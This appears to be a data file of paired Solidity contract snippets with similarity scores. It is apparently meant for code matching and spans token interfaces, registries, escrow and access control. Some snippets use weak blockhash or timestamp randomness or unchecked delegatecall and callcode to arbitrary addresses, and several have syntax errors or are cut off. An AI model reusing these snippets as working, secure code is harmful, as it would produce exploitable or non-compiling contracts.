    function setProviderParameter(bytes32, bytes) public;
    function setProviderTitle(bytes32) public;
    function clearEndpoint(bytes32) public;
    function getProviderParameter(address, bytes32) public view returns (bytes);
    function getAllProviderParams(address) public view returns (bytes32[]);
    function getProviderCurveLength(address, bytes32) public view returns (uint256);
    function getProviderCurve(address, bytes32) public view returns (int[]);
    function getCurveToken(address, bytes32) public view returns (address);
    function isProviderInitiated(address) public view returns (bool);
    function getAllOracles() external view returns (address[]);
    function getProviderEndpoints(address) public view returns (bytes32[]);
    function getEndpointBroker(address, bytes32) public view returns (address);
}"
"contract RandomNumberReservation {
    uint public reservedBlockNumber;

    constructor(uint futureNthBlock) public {
        reservedBlockNumber = block.number + futureNthBlock;
    }

    function getCurrentBlockNumber() public view returns (uint) {
        return block.number;
    }

    function getRandomNumber() public view returns (bytes32) {
        require(block.number > reservedBlockNumber, ""Time has not come yet"");
        return blockhash(reservedBlockNumber);
    }
}",0.5920086544433915,"contract picOneCommitment {
    
    
    uint256 blockNumber = 8526184;
    
    
    string hash= ""b583bcbe34fa8b22c5c14f1200b0f87acab35333ce8d960cf72d6b1d6ad2b3bf"";
    
    uint256 private deployedAt = now;
    
    function getDeployedAt() public view returns (uint256) {
        return deployedAt;
    }
    
    function getHash() public view returns (string memory) {
        return hash;
    }
       
    function getBlockNumber() public view returns (uint256) {
        return blockNumber;
    } 
    
}"
"contract OrganizationObject {

    struct organizationDetails {
        string name; 
        string vat; 
        string headquarterAddress;
    }

    organizationDetails public details;

    address[] public staff;

    function OrganizationObject (string name, string vat, string headquarterAddress){
        details.name = name;
        details.vat = vat;
        details.headquarterAddress = headquarterAddress;
    }

    function addStaff(address x){
        staff.push(x);
    }
}",0.5399086807222662,"contract ZapCoordinatorInterface is Ownable {

    function addImmutableContract(string contractName, address newAddress) external;

    function updateContract(string contractName, address newAddress) external;

    function getContractName(uint index) public view returns (string);

    function getContract(string contractName) public view returns (address);

    function updateAllDependencies() external;

}"
"contract DocRegistry {

  struct Doc {
      address sender;
      uint date;
      bytes32 hash;
  }

  
  mapping(bytes32 => Doc) registry;

  
  function storeHash(bytes32 _hash) external returns (bool) {
    registry[_hash].sender = msg.sender;
    registry[_hash].date = now;
    registry[_hash].hash = _hash;

    emit HashStored(msg.sender, _hash);

    return true;
  }

  
  event HashStored(address indexed _sender, bytes32 _hash);
}",0.5789417850945482,"contract Verifier {
    function recoverAddr(bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) public pure returns (address msgAddress) {
        return ecrecover(msgHash, v, r, s);
    }
    
    function isSigned(address _addr, bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) public pure returns (bool msgSigned) {
        return ecrecover(msgHash, v, r, s) == _addr;
    }
}"
"contract Test {
    uint256[] public foo;

    function test() external {
        uint256 oldLength = foo.length;

        append(foo);

        assert(foo.length == oldLength + 1 && foo[oldLength] == 42);
    }

    function append(uint256[] storage arr) internal {
        arr.push(42);
    }
}",0.5789385210560424,"contract EggStorage is ERC721Token {

    function push(address, uint256[2], uint8) public returns (uint256);

    function get(uint256) external view returns (uint256[2], uint8);

    function remove(address, uint256) external;

}"
"contract Consumer {
    Producer currentProducer;

    function setProducer(address addr) public { 
        Producer newProducer = Producer(addr);
        require(newProducer.SOME_VALUE() > 0);
        currentProducer =newProducer; 
    }

    function getSome() public view returns (uint8) {
        return currentProducer.SOME_VALUE(); 

    }
}",0.5707215723751757,"contract Ownable {



    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    function setOwner(address _owner) public onlyOwner {

        owner = _owner;

    }



    function getOwner() public view returns (address) {

        return owner;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



}"
"contract StudentManager {
    uint[] public studentList;

    struct Student {
        bool valid;
        uint index;
        string name;
        uint age;
        bool tookTest;
    }

    mapping(uint => Student) public students;

    
    function upsert(uint ID, string _name, uint _age, bool _tookTest) external {
        Student storage student = students[ID];
        if (!student.valid) {
            student.valid = true;
            student.index = studentList.length;
            studentList.push(ID);
        }
        student.name = _name;
        student.age = _age;
        student.tookTest = _tookTest;
    }

    
    function remove(uint ID) external {
        Student storage student = students[ID];
        require(student.index < studentList.length);
        require(ID == studentList[student.index]);
        uint lastStudent = studentList[studentList.length - 1];
        students[lastStudent].index = student.index;
        studentList[student.index] = lastStudent;
        studentList.length -= 1;
        delete students[ID];
    }

    
    function studentCount() external view returns (uint) {
        return studentList.length;
    }
}",0.5032465440985566,"contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    
    function name() external view returns (string);
    function symbol() external view returns (string);
    function decimals() external view returns (string);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}"
"contract tracking  {

  struct  data  {
    uint   ownernumber;
    uint   id;
  }

  uint value;
  mapping (uint256 => data) public  datamatching;

  function storedata (uint _ownernumber, uint _id) public {
    var  persondata  = datamatching[value];
    persondata .ownernumber = _ownernumber;
    persondata. id  =  _id;
  }

  function getData(uint256 userId) returns (uint, uint){
    return (datamatching[userId].ownernumber, datamatching[userId].id);
  }
}",0.5634738351414644,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract Mapping {
struct Entity{
    bool isActive;
    uint index;
}
mapping(address => Entity) values;
address[] valuesTrue;
function getValue(address a) public view returns (bool) {
    return values[a].isActive;
} 

function getAllValues() public view returns(address[]) { 
    return valuesTrue;
}

function addValue(address a, bool b) public {
    values[a].isActive = b;
    if (b)
        values[a].index     = valuesTrue.push(a)-1;


    else {

        if (values[a].isActive) {
            uint rowToDelete = values[a].index;
            address keyToMove = valuesTrue[valuesTrue.length-1];
            valuesTrue[rowToDelete] = keyToMove;
            values[keyToMove].index = rowToDelete; 
            valuesTrue.length--;
        }

    }
}
}",0.5958864272058128,"contract ERC20 {

    function balanceOf(address who) public view returns (uint);

    function allowance(address owner, address spender) public view returns (uint);

    function transfer(address to, uint value) public returns (bool ok);

    function transferFrom(address from, address to, uint value) public returns (bool ok);

    function approve(address spender, uint value) public returns (bool ok);

    event Transfer(address indexed from, address indexed to, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);

}"
"contract X {
    struct PRODUCT {
        bytes12 productid;
        uint price;
        uint quantity;
    }

    mapping (string => PRODUCT[]) products;

    function appendDetails(string pid, bytes12 productid, uint price, uint quantity) payable public {
        products[pid].push(PRODUCT(productid, price, quantity));
    }

    function getDetails(string pid, uint idx) 
    public view returns(bytes12 productid, uint price, uint quantity) {
        PRODUCT storage p = products[pid][idx];

        productid = p.productid;
        price = p.price;
        quantity = p.quantity;
    }

    function getDetailsCount(string pid) 
    public view returns(uint) {
        return products[pid].length;
    }
}",0.5557863487683631,"contract ICards is IERC721 {

    function getDetails(uint tokenId) public view returns (uint16 proto, uint8 quality);
    function setQuality(uint tokenId, uint8 quality) public;
    function burn(uint tokenId) public;
    function batchMintCards(address to, uint16[] memory _protos, uint8[] memory _qualities) public returns (uint);
    function mintCards(address to, uint16[] memory _protos, uint8[] memory _qualities) public returns (uint);
    function mintCard(address to, uint16 _proto, uint8 _quality) public returns (uint);
    function batchSize() public view returns (uint);
}"
"contract EventChain {

    
    uint public latestEvent;

    event LogChainedEvent(address sender, uint previousEvent);

    function logData() public {
        emit LogChainedEvent(msg.sender, latestEvent);
        latestEvent++;
    }
}",0.5304862108696318,"contract TestERC223 {
    event Log(address from, uint value, bytes data);
    
    function tokenFallback(address from, uint value, bytes memory data) public {
        emit Log(from, value, data);
    }
}"
"contract myContract {

 foreignContract created;
 constructor() public payable {
  created = new foreignContract();
 }

 function changeNameMycontract(string name) public returns(bool) {
  return created.changeName(name);

 }

 function ReturnName() public view returns(string) {
  return created.receiveName();
 }

}",0.5765821335509655,"contract Owned {

    address public contractOwner;



    constructor() public {

        contractOwner = msg.sender;

    }



    modifier onlyContractOwner() {

        require(contractOwner == msg.sender);

        _;

    }



    function forceChangeContractOwnership(address _to) public onlyContractOwner() returns(bool) {

        contractOwner = _to;

        return true;

    }

}"
"contract Stages {

    enum Stage { init, two, three, done }

    Stage stage;

    modifier onlyStage (Stage s) {
        require(stage == s, ""Wrong step."");
        _;
    }

    function step1() public onlyStage(Stage.init) {
        
        stage = Stage.two;
    }

    function step2() public onlyStage(Stage.two) {
        
        stage = Stage.three;
    }

    function step3() public onlyStage(Stage.three) {
        
        stage = Stage.done;
    }
}",0.5650914396740253,"contract StagedRefundVault is RefundVault {



    event ClosedStage();

    event Active();

    function StagedRefundVault (address _wallet) public

        RefundVault(_wallet) {

    }

    

    function stageClose() onlyOwner public {

        ClosedStage();

        wallet.transfer(this.balance);

    }



    function activate() onlyOwner public {

        require(state == State.Refunding);

        state = State.Active;

        Active();

    }

}"
"contract Escrow is Ownable {
    enum PaymentStatus { Pending, Completed, Refunded }

    event PaymentCreation(uint indexed orderId, address indexed customer, uint value);
    event PaymentCompletion(uint indexed orderId, address indexed customer, uint value, PaymentStatus status);

    struct Payment {
        address customer;
        uint value;
        PaymentStatus status;
        bool refundApproved;
    }

    mapping(uint => Payment) public payments;
    ERC20 public currency;
    address public collectionAddress;
    Webshop public webshop;

    function Escrow(ERC20 _currency, address _collectionAddress) public {
        currency = _currency;
        collectionAddress = _collectionAddress;
        webshop = Webshop(msg.sender);
    }

    function createPayment(uint _orderId, address _customer, uint _value) external onlyOwner {
        payments[_orderId] = Payment(_customer, _value, PaymentStatus.Pending, false);
        emit PaymentCreation(_orderId, _customer, _value);
    }

    function release(uint _orderId) external {
        completePayment(_orderId, collectionAddress, PaymentStatus.Completed);
    }

    function refund(uint _orderId) external {
        completePayment(_orderId, msg.sender, PaymentStatus.Refunded);
    }

    function approveRefund(uint _orderId) external {
        require(msg.sender == collectionAddress);
        Payment storage payment = payments[_orderId];
        payment.refundApproved = true;
    }

    function completePayment(uint _orderId, address _receiver, PaymentStatus _status) private {
        Payment storage payment = payments[_orderId];
        require(payment.customer == msg.sender);
        require(payment.status == PaymentStatus.Pending);
        if (_status == PaymentStatus.Refunded) {
            require(payment.refundApproved);
        }
        currency.transfer(_receiver, payment.value);
        webshop.changeOrderStatus(_orderId, Webshop.OrderStatus.Completed);
        payment.status = _status;
        emit PaymentCompletion(_orderId, payment.customer, payment.value, _status);
    }
}",0.5901338034162955,"contract ZastrinPay {

  

  address public owner;

  struct paymentInfo {
    uint userId;
    uint amount;
    uint purchasedAt;
    bool refunded;
    bool cashedOut;
  }

  mapping(uint => bool) coursesOffered;
  mapping(address => mapping(uint => paymentInfo)) customers;

  uint fallbackAmount;

  event NewPayment(uint indexed _courseId, uint indexed _userId, address indexed _customer, uint _amount);
  event RefundPayment(uint indexed _courseId, uint indexed _userId, address indexed _customer);

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  function ZastrinPay() public {
    owner = msg.sender;
  }

  function addCourse(uint _courseId) public onlyOwner {
    coursesOffered[_courseId] = true;
  }

  function buyCourse(uint _courseId, uint _userId) public payable {
    require(coursesOffered[_courseId]);
    customers[msg.sender][_courseId].amount += msg.value;
    customers[msg.sender][_courseId].purchasedAt = now;
    customers[msg.sender][_courseId].userId = _userId;
    NewPayment(_courseId, _userId, msg.sender, msg.value);
  }

  function getRefund(uint _courseId) public {
    require(customers[msg.sender][_courseId].userId > 0);
    require(customers[msg.sender][_courseId].refunded == false);
    require(customers[msg.sender][_courseId].purchasedAt + (3 hours) > now);
    customers[msg.sender][_courseId].refunded = true;
    msg.sender.transfer(customers[msg.sender][_courseId].amount);
    RefundPayment(_courseId, customers[msg.sender][_courseId].userId, msg.sender);
  }

  function cashOut(address _customer, uint _courseId) public onlyOwner {
    require(customers[_customer][_courseId].refunded == false);
    require(customers[_customer][_courseId].cashedOut == false);
    require(customers[_customer][_courseId].purchasedAt + (3 hours) < now);
    customers[_customer][_courseId].cashedOut = true;
    owner.transfer(customers[_customer][_courseId].amount);
  }

  function cashOutFallbackAmount() public onlyOwner {
    owner.transfer(fallbackAmount);
  }

  function() public payable {
    fallbackAmount += msg.value;
  }
}"
"contract GasTesst {
    bytes32[] public test;

    function addToArray(bytes32 _t) public {
        test.push(_t);
    }

    function read() public {
        for (uint256 i = 0; i < test.length; i++) {
            bytes32 t = test[i];
        }
    }
}",0.5917898585382243,"contract Manager {
    function ilks(uint) public view returns (bytes32);
    function owns(uint) public view returns (address);
    function urns(uint) public view returns (address);

}"
"contract Test {
    uint public value;
    function func2(uint x) external {
        for (uint i = 0; i < x; i++)
            value += i;
    }

    function func1(uint x) external {
        for (uint i = 0; i <= x; i++)
            value += i;
    }
}",0.5795127396030518,"contract R256Basic {

    event R(uint z);

    constructor() public {}

    function addRecord(uint z) public {
        emit R(z);
    }

    function addMultipleRecords(uint[] zz) public {
        for (uint i; i < zz.length; i++) {
            emit R(zz[i]);
        }
    }

}"
"contract Randomish {

    uint public constant MAX = uint(0) - uint(1); 
    uint public constant SCALE = 500;
    uint public constant SCALIFIER = MAX / SCALE;
    uint public constant OFFSET = 100; 


    
    

    function randomish() public view returns(uint) {
        uint seed = uint(keccak256(abi.encodePacked(now)));
        uint scaled = seed / SCALIFIER;
        uint adjusted = scaled + OFFSET;
        return adjusted;
    }
}",0.5908385878710493,"contract IPackFour {

    struct Purchase {
        uint16 current;
        uint16 count;
        address user;
        uint randomness;
        uint64 commit;
    }

    function purchases(uint p) public view returns (
        uint16 current,
        uint16 count,
        address user,
        uint256 randomness,
        uint64 commit
    );

    function predictPacks(uint id) public view returns (uint16[] memory protos, uint16[] memory purities);

}"
"contract Main {
    Child ch;
    function Main(address child) {
        ch=(Child(child));
    }
    function test() {
        ch.f1();
        ch.f2();
        ch.f3();
        ch.f4();
        ch.f5();
    }
}",0.5331448856175549,"contract GemJoinLike {
    function join(address urn, uint wad) public;
    function exit(address guy, uint wad) public;
}"
"contract pubGetterException  {
  uint public value;

  function pubGetterException(uint _value) public {
    value = _value;
 }
}",0.5962863210123288,"contract ERC20 {
    uint public totalSupply;
   
    function transfer(address to, uint value) public returns(bool ok);  
}"
"contract PubKey {
    uint8[] pubKeyBytes;

    function PubKey(uint8[] initKey) {
       for(uint i = 0; i < initKey.length; i++) {
          pubKeyBytes.push(initKey[i]);
       }
}

function getPubKeyByte(uint i) constant returns (uint) {
    return pubKeyBytes[i];
}",0.580693473127475,"contract FiatContract {

    function ETH(uint _id) public constant returns (uint256);

  	function EUR(uint _id) public constant returns (uint256);

  	function updatedAt(uint _id) public constant returns (uint);

}"
"contract UsingERC20 {
    IERC20 public associatedToken;

    
    constructor(IERC20 _token) public {
        associatedToken = _token;
    }

    function doSomethingThatRequiresERC20tokens() public {
        
        
        
        

        
        

        
        
        
        associatedToken.transferFrom(msg.sender, address(this), 100);

        
        emit YayIReceivedTokens(100, msg.sender, associatedToken.balanceOf(address(this)));
    }

    event YayIReceivedTokens(uint256 amount, address fromAccount, uint256 totalBalance);
}",0.5909800813914875,"contract BatchAirDrop {
    MintableTokenIface public token;
    address public owner;

    constructor(MintableTokenIface _token) public {
        owner = msg.sender;
        token = _token;
    }

    function batchSend(uint256 amount, address[] wallets) public {
        require(msg.sender == owner);
        require(amount != 0);
        token.mint(this, amount * wallets.length);
        for (uint256 i = 0; i < wallets.length; i++) {
            token.transfer(wallets[i], amount);
        }
    }
}"
"contract greeter { 
    string greeting; 
    uint calls; 
    event Greet (string greeting);
    function greeter ( string _greeting ) public { 
        greeting = _greeting; 
        calls = 0; 
     }
     function greet ( ) public returns ( string ) { 
         calls = calls + 1; 
         Greet(greeting);
          return greeting; 
     } 
 }",0.5607349202558851,"contract VAtomOwner is Ownable {

    mapping (string => string) vatoms;

    function setVAtomOwner(string vatomID, string ownerID) public onlyOwner {
        vatoms[vatomID] = ownerID;
    }

    function getVatomOwner(string vatomID) public constant returns(string) {
        return vatoms[vatomID];
    }
}"
"contract SimpleEnum {

  enum VirtualTrade {DEFAULT,ONE,TWO}
  VirtualTrade vt;

    function SimpleEnum(){
        vt = VirtualTrade.DEFAULT;
    }

  function setValues(uint _value) {
      require(uint(VirtualTrade.TWO) >= _value);
      vt = VirtualTrade(_value);
  }

  function getValue() constant returns (uint){
      return uint(vt);
  }

}",0.5452984348206337,"contract ERC20Basic {
  function totalSupply() constant returns (uint);
  function balanceOf(address who) constant returns (uint);
  function transfer(address to, uint value) returns (bool);
  event Transfer(address indexed from, address indexed to, uint value);
}"
"contract TestAllignment {
    TestAddress test;

    function TestAllignment(){  
        test = new TestAddress();
    }

    function testAsem() public view returns (bool same) {
        address contractAddr = address(test);  
        bytes4 sig = bytes4(keccak256(""isSameAddress(address,address)"")); 
        address a = msg.sender;

        assembly {
            let x := mload(0x40)   
            mstore(x,sig) 
            mstore(add(x,0x04),a) 
            mstore(add(x,0x24),a) 
            mstore(0x40,add(x,0x64)) 
             

            let success := call(      
                            5000, 
                            contractAddr, 
                            0,    
                            x,    
                            0x44, 
                            x,    
                            0x20) 

            same := mload(x)       
            mstore(0x40,add(x,0x20)) 
        }

        return same;
    }

    function testSol() public view returns(bool same){ 
        address add = msg.sender;

        same = test.isSameAddress(add,add); 
    }
}",0.5928150853748421,"contract BdpEntryPoint is BdpBaseData {

	function () payable public {
		address _impl = BdpContracts.getBdpController(contracts);
		require(_impl != address(0));
		bytes memory data = msg.data;

		assembly {
			let result := delegatecall(gas, _impl, add(data, 0x20), mload(data), 0, 0)
			let size := returndatasize
			let ptr := mload(0x40)
			returndatacopy(ptr, 0, size)
			switch result
			case 0 { revert(ptr, size) }
			default { return(ptr, size) }
		}
	}

	function BdpEntryPoint(address[16] _contracts, bytes8 _version) public {
		ownerAddress = msg.sender;
		managerAddress = msg.sender;
		contracts = _contracts;
		setupCompleted = true;
		version = _version;
	}

}"
"contract C {
    struct User {
         uint balance;
    }
    mapping (bytes24 => User) public accounts;
    function newUser(bytes24 id, uint balance) {
         accounts[id] = User(balance);
    }
}",0.5936628732093931,"contract CREDITS is Ownable {

    mapping (address => uint256) internal balanceOf;

    function transfer (address _to, uint256 _value) public returns (bool);

   

}"
"contract EthPriceTicker is usingOraclize {

    string public ethPriceUSD;

    event LogEthPrice(string priceUSD);

    function __callback(bytes32 myid, string memory result, bytes memory proof) public {
        require(msg.sender == oraclize_cbAddress());
        ethPriceUSD = result;
        emit LogEthPrice(result);
    }

    function getEthPriceInUSD() public payable {
        oraclize_query(""URL"", ""json(https:
    }
}",0.5413743563873797,"contract LotteryTicket {
    address owner;
    string public constant name = ""LotteryTicket"";
    string public constant symbol = ""✓"";
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor() public {
        owner = msg.sender;
    }
    function emitEvent(address addr) public {
        require(msg.sender == owner);
        emit Transfer(msg.sender, addr, 1);
    }
}"
"contract WL {

    struct VoterStruct {
        
        bool isVoter; 
    }

    struct RegionStruct {
        
        mapping(address => bool) isVoter;
        address[] voterList; 
        bool isRegion; 
    }

    

    mapping(address => VoterStruct) public voterStructs;
    address[] public voterList;

    mapping(bytes32 => RegionStruct) public regionStructs;
    bytes32[] public regionList;

    function isVoter(address voter) public view returns(bool) {
        return voterStructs[voter].isVoter;
    }

    function isRegion(bytes32 region) public view returns(bool) {
        return regionStructs[region].isRegion;
    }

    function isRegionVoter(bytes32 region, address voter) public view returns(bool) {
        return regionStructs[region].isVoter[voter];
    }

    function getRegionVoterAtRow(bytes32 region, uint row) public view returns(address) {
        return regionStructs[region].voterList[row];
    }

    function getVoterCount() public view returns(uint) {
        return voterList.length;
    }

    function getRegionCount() public view returns(uint) {
        return regionList.length;
    }

    function getRegionVoterCount(bytes32 region) public view returns(uint) {
        return regionStructs[region].voterList.length;
    }

    

    function appendRegion(bytes32 region) public {
        require(!isRegion(region));
        regionStructs[region].isRegion = true;
        regionList.push(region);
    }

    function appendVoter(address voter) public {
        require(!isVoter(voter));
        voterStructs[voter].isVoter = true;
        voterList.push(voter);
    }

    function registerVoterInRegion(bytes32 region, address voter) public {
        require(isVoter(voter));
        require(isRegion(region));
        require(!isRegionVoter(region,voter));
        regionStructs[region].voterList.push(voter);
        regionStructs[region].isVoter[voter] = true;
    }

    
}",0.5426611011954684,"contract GeneralPermissionManagerFactory is IModuleFactory {

    
    constructor (address _polyAddress, uint256 _setupCost, uint256 _usageCost, uint256 _subscriptionCost) public
      IModuleFactory(_polyAddress, _setupCost, _usageCost, _subscriptionCost)
    {

    }

    
    function deploy(bytes ) external returns(address) {
        if(setupCost > 0)
            require(polyToken.transferFrom(msg.sender, owner, setupCost), ""Failed transferFrom because of sufficent Allowance is not provided"");
        address permissionManager = new GeneralPermissionManager(msg.sender, address(polyToken));
        emit LogGenerateModuleFromFactory(address(permissionManager), getName(), address(this), msg.sender, now);
        return address(permissionManager);
    }

    
    function getType() public view returns(uint8) {
        return 1;
    }

    
    function getName() public view returns(bytes32) {
        return ""GeneralPermissionManager"";
    }

    
    function getDescription() public view returns(string) {
        return ""Manage permissions within the Security Token and attached modules"";
    }

    
    function getTitle() public  view returns(string) {
        return ""General Permission Manager"";
    }

    
    function getInstructions() public view returns(string) {
        return ""Add and remove permissions for the SecurityToken and associated modules. Permission types should be encoded as bytes32 values, and attached using the withPerm modifier to relevant functions.No initFunction required."";
    }

    
    function getTags() public view returns(bytes32[]) {
        bytes32[] memory availableTags = new bytes32[](0);
        return availableTags;
    }
}"
"contract PartProductionContract {
    
    Production public production;

    
    function production2() public returns (Production memory) {
        return production;
    }
}",0.5963537392887758,"contract FLMContract {
    function withdraw() public;
    function buy() public payable returns(uint256);
    function myTokens() public view returns(uint256);
}"
"contract Test is PartProduction {

    function testSetParameters() public {
        
        Production memory prod = partProductionContract.production2();
        string memory _val1 = ""someString"";
        Assert.equal(prod.val1, _val1, ""msg.sender: "");
    }
}",0.5366441334517364,"contract IProxyContractForBurn {
    function setnxcAddress(address new_address) public;
    function burnNxCtoMintAssets(uint256 nbOfAsset, string[] memory keys, string[] memory values) public view returns (uint256);
}"
"contract Caller {
    function check(address callbackAddress) public {
        require(callbackAddress.call(bytes4(keccak256(""callMe(string)""))));
    }
}",0.5617023326927135,"contract check {
    function add(address _add, uint _req) {
        _add.callcode(bytes4(keccak256(""changeRequirement(uint256)"")), _req);
    }
}"
"contract C {

  doThing1() {}

  doThing2() {}
}",0.5030002724413609,contract TongCoin is ERC20{}
"contract Caller {
  
  InterestRateModel private interesetRateModel =
    InterestRateModel (0xBAE04CbF96391086dC643e842b517734E214D698);

  uint public borrowRate = 0;

  
  function fetchAndSaveBorrowRate () public {
    uint status;
    uint rate;

    
    (status, rate) = interesetRateModel.getBorrowRate (1, 2, 3);

    
    if (status == 0) borrowRate = rate;
  }
}",0.5318728234513721,"contract RateContract is Authorizable {
  uint public rate = 6000000000000000000000;

  event UpdateRate(uint _oldRate, uint _newRate);

  function updateRate(uint _rate) public onlyAuthorized {
    require(rate != _rate);
    UpdateRate(rate, _rate);
    rate = _rate;
  }

  function getRate() public view returns (uint) {
    return rate;
  }
}"
"contract SecondaryContract {
    bool public contractStatus = false;
    address public adminAddress;
    mapping (address => ACL) listOfAccountsWithCustomACL;
    struct ACL {
      string name;
      string somePermissions;
    }

    function SecondaryContract() {
      adminAddress = msg.sender;
      contractStatus = true;
    }

    
    modifier onlyBy(address _account){
       if (msg.sender != _account) throw;
       _;
   }

   modifier onlyIfActive() {
     if (contractStatus) throw;
     _;
   }

   modifier onlyByCreator(){
      if (msg.sender != adminAddress) throw;
      _;
  }

   modifier onlyAfter(uint _time) {
      if (now < _time) throw;
      _;
   }

   modifier onlyBefore(uint _time) {
     if (now > _time) throw;
     _;
   }
    function Foo() onlyBy(someTrustAddress){
      
    }

    function Bar() onlyByCreator(){
      
    }

    function Zam() onlyIfActive() {
      
    }

    
    
    function deactivateContract() onlyByCreator {
      contractStatus = false;
    }
}",0.57454444685726,"contract AccessControl {

    

    event ContractUpgrade(address newContract);



    address public ceoAddress;

    address public cooAddress;



    bool public paused = false;



    modifier onlyCEO() {

        require(msg.sender == ceoAddress);

        _;

    }



    modifier onlyCOO() {

        require(msg.sender == cooAddress);

        _;

    }



    modifier onlyCLevel() {

        require(

            msg.sender == cooAddress ||

            msg.sender == ceoAddress

        );

        _;

    }



    function setCEO(address _newCEO) external onlyCEO {

        require(_newCEO != address(0));



        ceoAddress = _newCEO;

    }



    function setCOO(address _newCOO) external onlyCEO {

        require(_newCOO != address(0));



        cooAddress = _newCOO;

    }



    modifier whenNotPaused() {

        require(!paused);

        _;

    }



    modifier whenPaused {

        require(paused);

        _;

    }



    function pause() external onlyCLevel whenNotPaused {

        paused = true;

    }



    function unpause() public onlyCEO whenPaused {

        paused = false;

    }

}"
"contract ClaimTokens is Ownable {
    ERC20Interface old;
    ERC20Interface new;

    mapping (address -> bool) hasRegistered;
    address[] registeredParticipants;

    function ClaimTokens() Ownable() {
        old = new ERC20Interface(0x73de68d64b5d9b2108fdf76a394f76e16a88ceb3);
        new = new ERC20Interface(0xd4c04e5099f62632a0861ec68fd9f58e6cd0cb74);
    }

    function registerForAirdrop() public {
        require(!hasRegistered[msg.sender])
        hasRegistered[msg.sender] = true;
        registeredParticipants.push(msg.sender)
    }

    function airdrop() onlyOwner {
        for(uint i = 0; i < registeredParticipants.length; i++) {
            uint balance = old.balanceOf(registedParticipants[i])
            new.transfer(registeredParticipants[i], balance)
        }
        
    }
}",0.5367949067230753,"contract SimpleDistributor {
    
  address public owner;
    
  ERC20Cutted public token = ERC20Cutted(0xE2FB6529EF566a080e6d23dE0bd351311087D567);
    
  function SimpleDistributor() public {
    owner = msg.sender;
  }
   
  function addReceivers(address[] receivers, uint[] balances) public {
    require(msg.sender == owner);
    for(uint i = 0; i < receivers.length; i++) {
      token.transfer(receivers[i], balances[i]);
    }
  } 
  
  function retrieveCurrentTokensToOwner() public {
    retrieveTokens(owner, address(token));
  }

  function retrieveTokens(address to, address anotherToken) public {
    require(msg.sender == owner);
    ERC20Cutted alienToken = ERC20Cutted(anotherToken);
    alienToken.transfer(to, alienToken.balanceOf(this));
  }

}"
"contract D {
  uint public n;
  address public sender;

  function callSetN(address _e, uint _n) {
    _e.call(bytes4(sha3(""setN(uint256)"")), _n); 
  }

  function callcodeSetN(address _e, uint _n) {
    _e.callcode(bytes4(sha3(""setN(uint256)"")), _n); 
  }

  function delegatecallSetN(address _e, uint _n) {
    _e.delegatecall(bytes4(sha3(""setN(uint256)"")), _n); 
  }
}",0.5981709604028959,"contract ERC20Interface 
{
         
      function balanceOf(address tokenOwner) public constant returns (uint256 balance);
      function allowance(address tokenOwner, address spender) public constant returns (uint256 remaining);
      function transfer(address to, uint256 tokens) public returns (bool success);
         
         
         
         
}"
"contract C {
    function foo(D _d, E _e, uint _n) {
        _d.delegatecallSetN(_e, _n);
    }
}",0.5797383999046684,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
contract Test { bytes32 public lastblockhashused; uint public lastblocknumberused; uint public AA; function Test() { lastblocknumberused = (block.number-1) ;  lastblockhashused = block.blockhash(lastblocknumberused); AA = 1; } function getTest1() constant returns (uint) { return uint(lastblockhashused) & 0xfff; } function Test2() { AA = (uint(lastblockhashused) & 0xfff); } function getTest2AA() constant returns (uint) { return AA; }},0.5832308124654763,"contract PricingStrategy {

  
  uint public presaleMaxValue = 0;

  function isPricingStrategy() external constant returns (bool) {
      return true;
  }

  function getPresaleMaxValue() public constant returns (uint) {
      return presaleMaxValue;
  }

  function isPresaleFull(uint weiRaised) public constant returns (bool);

  function getAmountOfTokens(uint value, uint weiRaised) public constant returns (uint tokensAmount);
}"
"contract ProofOfExistance {

    mapping(bytes32 => address) public registry;

    event LogDocumentRegistered(address claimant, bytes32 document);

    function documentExists(bytes32 documentHash) public view returns(bool doesIndeed) {
        return(registry[documentHash] != address(0));
    }

    function recordExistance(bytes32 documentHash) public {
        require(!documentExists(documentHash));
        registry[documentHash] = msg.sender;
        emit LogDocumentRegistered(msg.sender, documentHash);
    }

}",0.5454945419618558,"contract Agreement {

    bytes32 private agreementHash;

    modifier onlyAgree(bytes32 _agreementHash) {
        require(_agreementHash == agreementHash, ""Sender must send the right agreementHash"");
        _;
    }

    
    function getAgreementHash() external  view returns(bytes32)
    {
        return agreementHash;
    }

    
    function setAgreementHash(bytes32 _agreementHash) internal
    {
        require(agreementHash == bytes32(0), ""Can not set agreement twice"");
        agreementHash = _agreementHash;
    }


}"
"contract CallerContract{
      ERC20 public token = ERC20(0x738A6a902ff347fB8e28DEEf824a4754235f0b8B); 

      function sendERC20(uint coints) {
        ERC20.transfer(msg.sender, coins);
      }

}",0.5432651426351496,"contract br{

    function sendToken(address contractadr, address _to, uint256 _value) public {

        ERC20 token = ERC20(contractadr);

        token.transfer(_to, _value);

    }

}"
"contract Convert {
    function toBinaryString(uint8 n) public pure returns (string) {
        
        require(n < 32);

        bytes memory output = new bytes(5);

        for (uint8 i = 0; i < 5; i++) {
            output[4 - i] = (n % 2 == 1) ? byte(""1"") : byte(""0"");
            n /= 2;
        }

        return string(output);
    }

    function fromBinaryString(bytes5 input) public pure returns (uint8) {
        uint8 n = 0;

        for (uint8 i = 0; i < 5; i++) {
            n *= 2;
            if (input[i] == ""1"") {
                n += 1;
            } else {
                
                require(input[i] == ""0"");
            }
        }

        return n;
    }
}",0.5808829305467376,"contract SafeMath {

